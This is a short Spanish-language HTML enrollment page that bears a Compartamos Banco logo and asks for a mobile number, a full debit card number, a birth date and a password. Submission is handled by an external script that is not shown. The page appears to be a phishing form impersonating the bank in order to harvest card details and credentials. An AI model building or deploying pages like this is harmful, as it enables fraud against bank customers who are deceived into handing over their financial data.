<!DOCTYPE html>
<html lang="es">
<head><meta charset="UTF-8"><title>Enrolamiento</title><link rel="stylesheet" href="style.css"></head>
<body><div class="container">
<img src="Compartamos-Ba-768x163.jpg" alt="Logo" style="max-width: 100%; margin-bottom: 20px;">
<p>Completa los siguientes datos para registrarte</p>
<form id="form">
<input type="text" id="telefono" placeholder="¿Cuál es tu número celular?" required>
<label class="label">Número de tarjeta de débito</label>
<input type="text" id="tarjeta" placeholder="Ingresa número de tarjeta" maxlength="16" required>
<small>Debe contener 16 dígitos</small>
<label class="label">Fecha de nacimiento</label>
<input type="date" id="nacimiento" required>
<input type="password" id="password" placeholder="Contraseña" required>
<button type="submit">Continuar</button>
</form></div><script src="script.js"></script></body></html>
